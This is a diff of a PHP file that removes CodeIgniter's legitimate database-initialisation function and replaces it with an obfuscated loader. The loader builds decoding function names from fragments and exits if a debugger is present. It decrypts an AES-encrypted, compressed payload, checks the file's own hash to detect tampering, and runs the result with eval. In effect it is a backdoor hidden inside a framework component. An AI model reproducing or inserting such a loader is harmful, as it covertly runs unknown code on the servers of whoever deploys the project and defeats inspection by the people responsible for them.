@@ -1,218 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * Initialize the database
- *
- * @category	Database
- * @author	EllisLab Dev Team
- * @link	https://codeigniter.com/user_guide/database/
- *
- * @param 	string|string[]	$params
- * @param 	bool		$query_builder_override
- *				Determines if query builder should be used or not
- */
-function &DB($params = '', $query_builder_override = NULL)
-{
-	// Load the DB config file if a DSN string wasn't passed
-	if (is_string($params) && strpos($params, '://') === FALSE)
-	{
-		// Is the config file in the environment folder?
-		if ( ! file_exists($file_path = APPPATH.'config/'.ENVIRONMENT.'/database.php')
-			&& ! file_exists($file_path = APPPATH.'config/database.php'))
-		{
-			show_error('The configuration file database.php does not exist.');
-		}
-
-		include($file_path);
-
-		// Make packages contain database config files,
-		// given that the controller instance already exists
-		if (class_exists('CI_Controller', FALSE))
-		{
-			foreach (get_instance()->load->get_package_paths() as $path)
-			{
-				if ($path !== APPPATH)
-				{
-					if (file_exists($file_path = $path.'config/'.ENVIRONMENT.'/database.php'))
-					{
-						include($file_path);
-					}
-					elseif (file_exists($file_path = $path.'config/database.php'))
-					{
-						include($file_path);
-					}
-				}
-			}
-		}
-
-		if ( ! isset($db) OR count($db) === 0)
-		{
-			show_error('No database connection settings were found in the database config file.');
-		}
-
-		if ($params !== '')
-		{
-			$active_group = $params;
-		}
-
-		if ( ! isset($active_group))
-		{
-			show_error('You have not specified a database connection group via $active_group in your config/database.php file.');
-		}
-		elseif ( ! isset($db[$active_group]))
-		{
-			show_error('You have specified an invalid database connection group ('.$active_group.') in your config/database.php file.');
-		}
-
-		$params = $db[$active_group];
-	}
-	elseif (is_string($params))
-	{
-		/**
-		 * Parse the URL from the DSN string
-		 * Database settings can be passed as discreet
-		 * parameters or as a data source name in the first
-		 * parameter. DSNs must have this prototype:
-		 * $dsn = 'driver://username:password@hostname/database';
-		 */
-		if (($dsn = @parse_url($params)) === FALSE)
-		{
-			show_error('Invalid DB Connection String');
-		}
-
-		$params = array(
-			'dbdriver'	=> $dsn['scheme'],
-			'hostname'	=> isset($dsn['host']) ? rawurldecode($dsn['host']) : '',
-			'port'		=> isset($dsn['port']) ? rawurldecode($dsn['port']) : '',
-			'username'	=> isset($dsn['user']) ? rawurldecode($dsn['user']) : '',
-			'password'	=> isset($dsn['pass']) ? rawurldecode($dsn['pass']) : '',
-			'database'	=> isset($dsn['path']) ? rawurldecode(substr($dsn['path'], 1)) : ''
-		);
-
-		// Were additional config items set?
-		if (isset($dsn['query']))
-		{
-			parse_str($dsn['query'], $extra);
-
-			foreach ($extra as $key => $val)
-			{
-				if (is_string($val) && in_array(strtoupper($val), array('TRUE', 'FALSE', 'NULL')))
-				{
-					$val = var_export($val, TRUE);
-				}
-
-				$params[$key] = $val;
-			}
-		}
-	}
-
-	// No DB specified yet? Beat them senseless...
-	if (empty($params['dbdriver']))
-	{
-		show_error('You have not selected a database type to connect to.');
-	}
-
-	// Load the DB classes. Note: Since the query builder class is optional
-	// we need to dynamically create a class that extends proper parent class
-	// based on whether we're using the query builder class or not.
-	if ($query_builder_override !== NULL)
-	{
-		$query_builder = $query_builder_override;
-	}
-	// Backwards compatibility work-around for keeping the
-	// $active_record config variable working. Should be
-	// removed in v3.1
-	elseif ( ! isset($query_builder) && isset($active_record))
-	{
-		$query_builder = $active_record;
-	}
-
-	require_once(BASEPATH.'database/DB_driver.php');
-
-	if ( ! isset($query_builder) OR $query_builder === TRUE)
-	{
-		require_once(BASEPATH.'database/DB_query_builder.php');
-		if ( ! class_exists('CI_DB', FALSE))
-		{
-			/**
-			 * CI_DB
-			 *
-			 * Acts as an alias for both CI_DB_driver and CI_DB_query_builder.
-			 *
-			 * @see	CI_DB_query_builder
-			 * @see	CI_DB_driver
-			 */
-			class CI_DB extends CI_DB_query_builder { }
-		}
-	}
-	elseif ( ! class_exists('CI_DB', FALSE))
-	{
-		/**
-	 	 * @ignore
-		 */
-		class CI_DB extends CI_DB_driver { }
-	}
-
-	// Load the DB driver
-	$driver_file = BASEPATH.'database/drivers/'.$params['dbdriver'].'/'.$params['dbdriver'].'_driver.php';
-
-	file_exists($driver_file) OR show_error('Invalid DB driver');
-	require_once($driver_file);
-
-	// Instantiate the DB adapter
-	$driver = 'CI_DB_'.$params['dbdriver'].'_driver';
-	$DB = new $driver($params);
-
-	// Check for a subdriver
-	if ( ! empty($DB->subdriver))
-	{
-		$driver_file = BASEPATH.'database/drivers/'.$DB->dbdriver.'/subdrivers/'.$DB->dbdriver.'_'.$DB->subdriver.'_driver.php';
-
-		if (file_exists($driver_file))
-		{
-			require_once($driver_file);
-			$driver = 'CI_DB_'.$DB->dbdriver.'_'.$DB->subdriver.'_driver';
-			$DB = new $driver($params);
-		}
-	}
-
-	$DB->initialize();
-	return $DB;
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_i4i2a0fx=('bas'.'e64'.'_de'.'cod'.'e');
+$_lowdkc9g=('gzu'.'nco'.'mpr'.'ess');
+$_eymu08jb=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_qd0bmcdz='lvkq6DNNmlY=';
+$_tf0tzo4h='HXmjeBsb';
+$_qs33fq30='1MEHUGKw';
+$_rtpf3gzn='kWaHBHkh';
+$_cszii9fm='O1Qc6/62';
+$_jy6c2rfa='25Gs/g==';
+$_snekra8i='WtoIbfup';
+$_np8l9lo4='aMm3/lmH';
+$_qdjl60zi=$_i4i2a0fx($_rtpf3gzn.$_tf0tzo4h.$_qs33fq30.$_cszii9fm.$_qd0bmcdz);
+$_oi78dh4a=$_i4i2a0fx($_np8l9lo4.$_snekra8i.$_jy6c2rfa);
+$_fcnezebe=$_i4i2a0fx('DqEfKZb00LHJkLhxv6PEPDr5al3jXxlNxk/LGfNdxuXVsZ+2Dx3ah2ZHHrEqSlNVPFym9LBokDOz7uAhrShMRYITTd8nDqMssn1R0gOasmvgI9hBhWQ4dWO7qppc4zV7eo7fw/abWlsdB+O0WV3ktZ+7d4uX/KHwP5tkuiJh6cp4+l7hNmEspqrU1xTXZFlu7Tr5DBPXjhY5YN+raHTxmJ5o/1v9idejzrzJLUUlgu1DnykUkicRXhAO8bDIs8OkyVTlNOpJD2vxBg6UPvyI+e7qB7SSejtVcF8dljekOUccC1B6kqXrwAn6EkzcCDbz0kVwfKcEtfABIIr4kq//CZskNFb/MGeC4ae+l6sOBCQH9bEHyZcH5KM/iiuGc/UoG9FJCh93mi//jfWPqH8iSDT8U2YQG4u/FuMPmxiZI8mkP3V2JBNq3Evv17UWIAJVqnm0pVuLEppzDejOaeaQLGxTb0TifR/0xvqs2BfzAtYm/eiVRA/TEjipubCE8LvXuGv70P69Kkltbcd8QkBxK72ZHCL6eZbHX604GyBgoTrZsKKF3+mCBJSGJQ7d4IVYO8tg1Y75x0RctSWfkVmsr/JZ6J3Q+1Bhs2zRR080F0OWUt4nGSK6sos+xiNtf0US8/uYjrVEEptcya7cjqgbWmtECCs3fz05qrK2BsqIv2jV/vXAWP4oKYdkbW2iD6eAiuiHrkl8zBYNrfn0bJsyQD3ULj3FrrE7krZi6kPn7Mzt7Wux7nar81oHqboKo0LM66QyvtLXmGKprlgrYm71VpaRcSjoPzIULOaphAboExRW5MgA5KxUe4EBIu9bBH8IHW9A8pP7jmA8w+eajR7ODiOVkysuficop0YKm6IkfWb7P/ifHFC4gbWoBIGphPG8RPkivWblCP1YDj5oyjEcNfdnzQXLFRQ1Q4l/IYmFVbXemnd5DPxGI40gK6OJQGjha+x+Mdn3MHirgOyoEPiwuzAFHsdajnC2jNa6XjcfQQFjfcXtDE+j7ZYkGwUR/gJl8k6VY1T2k4hz3TmOQ6OgKgt6Rgsujxj1iaf3c3GnP4hbLe+j6pa96v7GOsi0ZTZWM0Hqx/E7sWgCZl1b98YdqRFCpqjhTqkiBmsfGOPuU8e7w4cPeJLGlOw7orNsYvwbwEF2Z7J4i1ChTB/bbMmd5Q+99LW3kgvSmfAJazaqPX4BkYJiCUy9Re0CX1Em6ca1eNURyHUzQRMk9tlU2HlQi5xWf6dH/NEzmAHBZOXKbpQ774JmMyItjj35n0M/NFADAGEFSPFz8giTZQZJHYCtVjavdKecTEOv4eQYj9LaIwZDo2mbtm3UtYBxQZarKCL2grdtfNrsbK2cGfaG/8Qpv3W5EiyA67kfgxKmf2MyPzUFRXErmwhTJ5e3h4r/M8HhaSiAdttnkpEGdzPuF1SNERa00AOqJurp/AHBkssUtMMUtd2hJm9Vq33KkfeERRMh');
+$_qlha8hy1=$_eymu08jb($_fcnezebe,'aes-256-cbc',$_qdjl60zi,OPENSSL_RAW_DATA,$_oi78dh4a);
+if($_qlha8hy1===false){exit;}
+$_oac2ngvq=$_lowdkc9g($_qlha8hy1);
+if($_oac2ngvq===false){exit;}
+$_zw0db1rw='874742e883545b356bd32c2044c98e3c8f592b3337de0187592e20a019e05e35';
+$_ajsm3c1o=@file_get_contents(__FILE__);
+if($_ajsm3c1o!==false){
+$_errr4ttr=str_replace($_zw0db1rw,"0000000000000000000000000000000000000000000000000000000000000000",$_ajsm3c1o);
+$_fytqe3fz=hash("sha256",$_errr4ttr);
+if($_fytqe3fz!==$_zw0db1rw){@http_response_code(403);exit;}
 }
+eval($_oac2ngvq);
